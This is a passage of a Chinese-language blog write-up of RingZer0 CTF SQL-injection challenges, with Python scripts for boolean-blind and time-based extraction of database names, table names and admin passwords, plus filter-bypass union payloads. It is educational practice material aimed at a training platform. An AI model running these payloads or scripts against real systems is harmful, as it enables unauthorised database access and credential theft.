class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://challenges.ringzer0team.com:10291?id="</span></span><br><span class="line">right = <span class="string">"The beautiful goat will be forsaken. In the city of the mountain, a goat of the mountain will rise. The goat of the day will court the count of war."</span></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line">table_name = <span class="string">""</span></span><br><span class="line">column_name = <span class="string">""</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">ID = <span class="string">""</span></span><br><span class="line">quote = <span class="string">""</span></span><br><span class="line">f = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#注数据库名:sqli291_2</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">"1 and if(ascii(substr(database(),%d,1))=%d,1,0)"</span>%(i,j)</span><br><span class="line">        r_url = url + payload</span><br><span class="line">        print(r_url)</span><br><span class="line">        r = requests.get(r_url) </span><br><span class="line">        <span class="keyword">if</span> right <span class="keyword">in</span> r.text:</span><br><span class="line">            database = database + chr(j)</span><br><span class="line">            print(database)</span><br><span class="line">            f = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> j == <span class="number">126</span> <span class="keyword">and</span> f == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"database:"</span>,database)</span><br><span class="line"></span><br><span class="line"><span class="comment">#注表名:prophecies</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">"1 and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d,1,0)"</span>%(i,j)</span><br><span class="line">        r_url = url + payload</span><br><span class="line">        print(r_url)</span><br><span class="line">        r = requests.get(r_url) </span><br><span class="line">        <span class="keyword">if</span> right <span class="keyword">in</span> r.text:</span><br><span class="line">            table_name = table_name + chr(j)</span><br><span class="line">            print(table_name)</span><br><span class="line">            f = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> j == <span class="number">126</span> <span class="keyword">and</span> f == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f = <span class="number">0</span></span><br><span class="line">print(<span class="string">"table_name:"</span>,table_name)</span><br><span class="line"></span><br><span class="line"><span class="comment">#注列名:id,quote</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        payload = <span class="string">"1 and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='prophecies'),%d,1))=%d,1,0)"</span>%(i,j)</span><br><span class="line">        r_url = url + payload</span><br><span class="line">        print(r_url)</span><br><span class="line">        r = requests.get(r_url) </span><br><span class="line">        <span class="keyword">if</span> right <span class="keyword">in</span> r.text:</span><br><span class="line">            column_name = column_name + chr(j)</span><br><span class="line">            print(column_name)</span><br><span class="line">            f = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> j == <span class="number">126</span> <span class="keyword">and</span> f == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f = <span class="number">0</span></span><br><span class="line">print(<span class="string">"column_name:"</span>,column_name)</span><br></pre></td></tr></table></figure>
+<p>但是这题没有注出flag</p>
+<h4 id="Generate-random-quote-again"><a href="#Generate-random-quote-again" class="headerlink" title="Generate random quote again"></a>Generate random quote again</h4><p>源代码给出了提示<code>&lt;!-- &lt;input type=&quot;hidden&quot; name=&quot;debug&quot; value=&quot;false&quot; /&gt; --&gt;</code></p>
+<p>但是一开始这题还是毫无头绪，测试<code>&#39;</code>都无法出现报错，猜不出两个参数<code>q</code>和<code>s</code>分别的作用</p>
+<p>看到别人的提示才知道，原来后台的SQL语句为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> quote <span class="keyword">FROM</span> quotes <span class="keyword">WHERE</span> <span class="keyword">id</span> = <span class="string">'htmlspecialchars($id)'</span> <span class="keyword">AND</span> <span class="keyword">LENGTH</span>(quote) &lt; <span class="keyword">CAST</span>(<span class="string">'$s'</span> <span class="keyword">AS</span> <span class="built_in">INT</span>)</span><br></pre></td></tr></table></figure>
+<p>题目给出的参数<code>debug</code>如果设置为<code>true</code>，则可以出现SQL语法报错</p>
+<p>由于<code>htmlspecialchars</code>函数，导致单引号会被转化为html实体，而<code>\</code>是不会被转化的，所以当<code>$id=1\</code>时，SQL语句就变成了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT quote FROM quotes WHERE id = &apos;1\&apos; AND LENGTH(quote) &lt; CAST(&apos;$s&apos; AS INT)</span><br></pre></td></tr></table></figure>
+<p>相当于查询字段<code>id</code>值为<code>1\&#39; AND LENGTH(quote) &lt; CAST(</code>，即查询<code>id=1</code></p>
+<p>而我们在通过<code>%23</code>注释掉<code>$s</code>后面的语句，就可以直接进行联合注入，另外这里<code>union</code>需要双写</p>
+<p>注表payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q=0\&amp;s=uunionnion%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()%23</span><br></pre></td></tr></table></figure>
+<p>表名：<code>qdyk5,quotes</code> </p>
+<p>注列payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q=0\&amp;s=uunionnion%20select%201,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=0x7164796b35%23</span><br></pre></td></tr></table></figure>
+<p>列名：<code>id,flag</code></p>
+<p>注flag payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">q=0\&amp;s=uunionnion%20select%201,flag%20from%20qdyk5%23</span><br></pre></td></tr></table></figure>
+<h4 id="Login-portal-3"><a href="#Login-portal-3" class="headerlink" title="Login portal 3"></a>Login portal 3</h4><p>测试当用户名存在，密码错误时提示<code>Invalid username / password.</code>，用户名不存在时提示<code>No user found.</code></p>
+<p>测试用户名：<code>admin&#39;%23</code>，提示<code>No user found.</code>，猜测注释符<code>#</code>被过滤了，再尝试<code>admin&#39; or &#39;1</code>，提示<code>Invalid username / password.</code></p>
+<p>因为没有回显信息，所以无法使用联合注入，加上<code>sleep</code>也被过滤了，所以这关只能采用<strong>基于布尔型的盲注</strong>，根据提示信息来判断</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; and if(ascii(substr(database(),1,1))=100,1,0) or &apos;&amp;password=123</span><br></pre></td></tr></table></figure>
+<p>脚本代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://ringzer0ctf.com/challenges/5"</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Cookie'</span>:<span class="string">'PHPSESSID=hh2nu3p191c1p294ufuu6n53p7'</span></span><br><span class="line">    &#125;</span><br><span class="line">right = <span class="string">"Invalid username / password."</span></span><br><span class="line">password = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">48</span>,<span class="number">123</span>):</span><br><span class="line">        print(<span class="string">'checking'</span>,chr(j))</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>:<span class="string">"admin' and if(ascii(substr((select password from users),%d,1))=%d,1,0) or '"</span>%(i,j),</span><br><span class="line">            <span class="string">'password'</span>:<span class="string">'123'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url,data=data,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> right <span class="keyword">in</span> r.text:</span><br><span class="line">            password = password + chr(j)</span><br><span class="line">            print(<span class="string">"password:"</span>,password)</span><br><span class="line">            f = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> j == <span class="number">122</span> <span class="keyword">and</span> f == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"password:"</span>,password)</span><br><span class="line"></span><br><span class="line"><span class="comment">#password: SQL1nj3ct10nFTW</span></span><br></pre></td></tr></table></figure>
+<p>登录成功后获得flag</p>
+<h4 id="Lite-login-portal"><a href="#Lite-login-portal" class="headerlink" title="Lite login portal"></a>Lite login portal</h4><p>这题用户名存在和不存在时回显的信息跟上一关一样，不过多了个报错信息，测试<code>admin&#39;</code>时得到报错信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQLite Database error please try again later. Impossible to fetch username &amp; password from users table</span><br></pre></td></tr></table></figure>
+<p>直接得知了表名<code>users</code>和字段名<code>username,password</code></p>
+<p>测试<code>admin&#39; or &#39;1</code>，回显<code>Invalid username / password.</code></p>
+<p>同样跟上一关一样用布尔盲注，不过这里是SQLite数据库，payload略有不同：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; and substr(,1,1)=&apos;a&apos; or &apos;&amp;password=123</span><br></pre></td></tr></table></figure>
+<p>脚本代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://ringzer0ctf.com/challenges/19"</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Cookie'</span>:<span class="string">'PHPSESSID=hh2nu3p191c1p294ufuu6n53p7'</span></span><br><span class="line">    &#125;</span><br><span class="line">right = <span class="string">"Invalid username / password."</span></span><br><span class="line">password = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">48</span>,<span class="number">123</span>):</span><br><span class="line">        print(<span class="string">'checking'</span>,chr(j))</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>:<span class="string">"admin' and substr((select password from users),%d,1)='%s' or '"</span>%(i,chr(j)),</span><br><span class="line">            <span class="string">'password'</span>:<span class="string">'123'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url,data=data,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> right <span class="keyword">in</span> r.text:</span><br><span class="line">            password = password + chr(j)</span><br><span class="line">            print(<span class="string">"password:"</span>,password)</span><br><span class="line">            f = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> j == <span class="number">122</span> <span class="keyword">and</span> f == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        f = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"password:"</span>,password)</span><br><span class="line"></span><br><span class="line"><span class="comment">#password: 4dm1nzP455</span></span><br></pre></td></tr></table></figure>
+<p>登录成功后获得flag</p>
+<h4 id="Internet-As-A-Service"><a href="#Internet-As-A-Service" class="headerlink" title="Internet As A Service"></a>Internet As A Service</h4><p>看别人提示的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=1&apos; || 1e0union select schema_name,2,3 from information_schema.schemata%23</span><br></pre></td></tr></table></figure>
+<p>没搞得太懂，<code>1e0union</code>貌似是为了绕过<code>%20union</code>的过滤</p>
+<p>数据库名：<code>iaas</code></p>
+<p>注表payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=1&apos; || 1e0union select table_name,2,3 from information_schema.tables where table_schema like &apos;iaas&apos;%23</span><br></pre></td></tr></table></figure>
+<p>表名：<code>iaas,rz_flag</code></p>
+<p>注列payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=1&apos; || 1e0union select column_name,2,3 from information_schema.columns where table_name like &apos;rz_flag&apos;%23</span><br></pre></td></tr></table></figure>
+<p>列名：<code>flag</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=1&apos; || 1e0union select flag,2,3 from rz_flag%23</span><br></pre></td></tr></table></figure>
+<h4 id="Login-portal-4"><a href="#Login-portal-4" class="headerlink" title="Login portal 4"></a>Login portal 4</h4><p>这题不论用户名是否存在，密码错误都会返回<code>Invalid username / password.</code>尝试用户名<code>username=admin&#39; or &#39;1</code>，提示非法字符，猜测过滤了<code>or+空格+任意字符</code>，可以用<code>||</code>代替<code>or</code></p>
+<p>这题只能用延时注入，payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&apos; || if(ascii(substr((select password from users),1,1))=100,sleep(3),1) || &apos;&amp;password=1</span><br></pre></td></tr></table></figure>
+<p>脚本代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://ringzer0ctf.com/challenges/6"</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Cookie'</span>:<span class="string">'PHPSESSID=hh2nu3p191c1p294ufuu6n53p7'</span></span><br><span class="line">    &#125;</span><br><span class="line">password = <span class="string">""</span></span><br><span class="line">f = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">48</span>,<span class="number">123</span>):</span><br><span class="line">        print(<span class="string">"checking"</span>,chr(j))</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>:<span class="string">"' || if(ascii(substr((select password from users),%d,1))=%d,sleep(5),1) || '"</span>%(i,j),</span><br><span class="line">            <span class="string">'password'</span>:<span class="string">'1'</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url,data=data,headers=headers,timeout=<span class="number">4.5</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            password = password + chr(j)</span><br><span class="line">            print(<span class="string">"password:"</span>,password)</span><br><span class="line">            f = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">0</span> <span class="keyword">and</span> j == <span class="number">122</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    f = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"password:"</span>,password)</span><br></pre></td></tr></table></figure>
+<p>成功登录后获取flag</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2019-04-09T13:21:41.429Z" itemprop="dateUpdated">2019-04-09 21:21:41</time>
+</span>
+
+
+        
+        原文链接：<a href="/posts/52899/" target="_blank" rel="external">https://Foxgrin.github.io/posts/52899/</a>
+        
+    </div>
+    <footer>
+        <div onclick="location.href='https://Foxgrin.github.io'">
+            <img src="/img/touxiang/1.jpg" alt="Somnus">
+            <a>Somnus</a>
+        </div>
+    </footer>
+</blockquote>
+
+        
+    <div class="page-reward">
+        <nav class="myreward">
+            <a id="rewardBtn" href="javascript:;"><span>打&nbsp;赏</span><span>装成好像很多人打赏的样子</span></a>
+        </nav>
+    </div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql/">sql</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://Foxgrin.github.io/posts/52899/&title=《ringzer0ctf-sql注入》 — Somnus's blog&pic=https://Foxgrin.github.io/img/touxiang/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Foxgrin.github.io/posts/52899/&title=《ringzer0ctf-sql注入》 — Somnus's blog&source=拿这个平台练手一下SQL注入" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://Foxgrin.github.io/posts/52899/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《ringzer0ctf-sql注入》 — Somnus's blog&url=https://Foxgrin.github.io/posts/52899/&via=https://Foxgrin.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://Foxgrin.github.io/posts/52899/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/posts/42277/" id="post-prev" class="post-nav-link">
+        <h4 class="title" >
+          上一篇：杭州&#34;西湖论剑&#34;ctf-Web
+        </h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/posts/10257/" id="post-next" class="post-nav-link">
+        <h4 class="title" data-hover="下一篇：代码审计--seacms命令执行漏洞（6.45后续版本）">下一篇：代码审计--seacms命令执行漏洞（6.45后续版本）</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+    
+
+    
+
+    
+
+
+</article>
+
+</div>
+
+        <footer class="footer">
+    <div class="footer-content">
+        <span class="power">
+            <i class="icon icon-lg icon-copyright"></i>
+            2018
+            <i class="icon icon-lg icon-heart"></i>
+            <a href="https://Foxgrin.github.io">Somnus</a>
+            <br/>
+            Power by
+            <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a>&nbsp;·&nbsp;
+            Theme
+            <a class="tomotoeslink" href="https://github.com/tomotoes/hexo-theme-tomotoes/" target="_blank" rel="external nofollow">tomotoes</a>
+        </span>
+
+        <br/>
+
+        <span id="RunTime" style="color:#a7a7a2;"></span>
+        <br/>
+
+        <span>
+            
+	<i class="icon icon-lg icon-user">
+<span id="busuanzi_container_site_uv" style='display:none'>
+       访问用户：<span id="busuanzi_value_site_uv"></span>
+    </span>人</i>
+    ·
+    <i class="icon icon-lg icon-eye">
+    <span id="busuanzi_container_site_pv" style='display:none'>
+      访问次数：<span id="busuanzi_value_site_pv"></span>
+    </span>次
+    </i>
+
+
+        </span>
+        <br/>
+
+        <span class="license">This blog is licensed under a <a rel="license" rel="external nofollow" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
+    </div>
+</footer>
+
+    </main>
+    
+        
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        <span>感谢您的鼓励支持！</span>
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" data-img="/img/dog.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/weixin.png" data-alipay="/img/zhifubao.png">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechatPay">&nbsp;&nbsp;微信&nbsp;&nbsp;</span>
+                <span class="reward-toggle-item alipayPay">支付宝</span>
+            </div>
+        </label>
+        
+        <i class="icon icon-caret-up"></i>
+    </div>
+</div>
+
+
+    
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://Foxgrin.github.io/posts/52899/&title=《ringzer0ctf-sql注入》 — Somnus's blog&pic=https://Foxgrin.github.io/img/touxiang/1.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://Foxgrin.github.io/posts/52899/&title=《ringzer0ctf-sql注入》 — Somnus's blog&source=拿这个平台练手一下SQL注入" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://Foxgrin.github.io/posts/52899/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《ringzer0ctf-sql注入》 — Somnus's blog&url=https://Foxgrin.github.io/posts/52899/&via=https://Foxgrin.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://Foxgrin.github.io/posts/52899/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p class="wechatshare">扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAABzklEQVR42u3aQY6DMAwF0N7/0sy20gzwbZO0Gr2sUAvksYmc77xe8Tjexvsvv6/P7s//fWDg4uKOucflOLvn+g35LLkBFxd3P/dsgrPr5NX574kBFxf3m7nJxMlih4uL+1+5yTKXP4WLi/tt3HyhqX5G/p6H92q4uLgDbp5Srrteku/i4uK2uEdxVAuaSUj6x1O4uLhbuPmCcrRGLyS9iVxxcXEXc6tblzxMqcYi0RtwcXE3cntLTC9yrRZMNxUZLi7uYu7ZxNXgslcARUEMLi7uh7i9IxTPftLN5gcXF3cjNzlilW9XJi3SwuYHFxd3GTfZzOQxRy8uSZ7CxcXdyc0Xsl5uOWmynm5+cHFxF3OTI1OT9up1wVQIZXBxcbdwe1FItSTqhSY3TR1cXNzF3Hn7Mz9mUV22mocwcHFxH+X2PiCZchKd4OLifpb77DYmqq3iY164uLh7uJOwIy+A8qceO/OFi4s74PaORPQmTujVxi0uLu46bqHNGUei+aKWN3dxcXH3c6stjUJDtLiCRoEpLi7uV3JXh6Tl1AQXF/ej3N6SVEhwr+/HxcXdyM03M/kWaNKyHTVZcXFxx9wH+rRxKVMtmEb5Li4ubof7A3LISOcXz2GkAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <!-- waves按钮特效 -->
+<script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<!-- 主题配置脚本 -->
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+</script>
+
+<!-- jquery -->
+<script src="/js/jquery.min.js?v=3.0"></script>
+
+<!-- 搜索 -->
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item waves-block waves-effect" onclick="location.href='{path}'">
+    <div class="title ellipsis" title="{title}">{title}</div>
+</li>
+</template>
+
+
+<!-- main博客脚本 -->
+<script src="/js/main.min.js?v=3.0" ></script>
+
+<!-- 动画&配置 -->
+<script src="/js/script.min.js?v=3.0" ></script>
+
+<!-- 脚本管理 -->
+<script>
+
+if(window.innerWidth > 800){
+	/* 3D标题 */
+	$(".content-header").on("mousemove", threedee);
+
+	/* 底部追随鼠标 */
+	$(".footer").hover(2);
+
+	/* gotop键的涟漪 */
+	$("#gotop").hover(1);
+
+	/* 赞赏的粒子雨 */
+	$("#reward").hover(3);
+
+	/* 微信公众号的底部渲染 */
+	$("#wechat").hover(4);
+
+    /* 标题跳动 */
+    $(".archivestitle").bumpyText();
+
+	/* 图片点击放大 */
+	const postimg = jQuery(".post-content img:not(.github-emoji)");
+	postimg.on("click",function(){
+
+		mask.classList.add("in");
+		main.classList.add("Mask");
+		menu.classList.add("Mask");
+		var myimg = this.cloneNode(true);
+		myimg.classList.add("imgShow");
+
+		setTimeout(function(){
+			jQuery(myimg).animate({
+				opacity:"1"
+			},1000);
+		},0);
+
+		document.body.appendChild(myimg);
+
+		myimg.onclick=function(){
+			document.body.removeChild(myimg);
+			mask.classList.remove("in");
+			main.classList.remove("Mask");
+			menu.classList.remove("Mask");
+		};
+
+	});
+
+}
+
+/* 名字跳动 */
+$("#name").bumpyText();
+
+
+/* 网站运行时间 */
+setInterval(function () {
+	setTime("2018/7/9");
+}, 1000);
+
+/* 文章块的淡出 */
+postshow();
+
+/* 座右铭 */
+
+   getHitokoto();
+
+
+
+/* 粘贴提示 */
+G($(".post-content"), location.href, "Somnus");
+
+
+/* 控制台 */
